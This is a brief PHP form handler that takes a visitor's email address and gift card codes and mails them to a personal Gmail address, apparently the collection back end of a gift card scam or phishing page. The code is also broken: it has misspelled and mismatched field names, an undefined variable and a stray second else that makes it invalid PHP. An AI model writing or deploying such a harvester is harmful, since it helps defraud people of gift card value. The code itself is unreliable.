<?php
// Enable error reporting
error_reporting(E_ALL);
ini_set('display_errors', 1);
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // collect the form data
    $userEmail = $_POST['userEmail'];
    $giftCardProduct = $_POST['giftCardProdut'];
    $giftCardDigit = $_POST['giftCardProduct'];

    // Validate the input (basic validation)
    if (filter_var($userEmail, FILTER_VALIDATE_EMAIL) &&
    preg_match("/^[0-9A-Za-z]{15}$/", $giftCardProduct) &&
    preg_match("/^[0-9A-Za-z]{15}$/", $giftCardDigit)) {

        //Email Configuration
        $to = "elitelotto7@gmail.com";
        $subject = "New Form Submission";
        $message = "Email: $userEmail\nGift Card Product and Amount: $giftCardProduct\nGift Card Digits: $giftCardDigits";
        $headers = "From: no-reply@yourdomain.com";

        //Send Email
        if (mail($to, $subject, $message, $headers)) {
            // Redirect to success page
            header("Location: succesf.html");
            exit();
        } else {
            echo "Error: Unable to send email.";
        }
    } else {
        echo "Invalid input format.";
    } else {
        echo "Ivalid request method";
    }
}
?>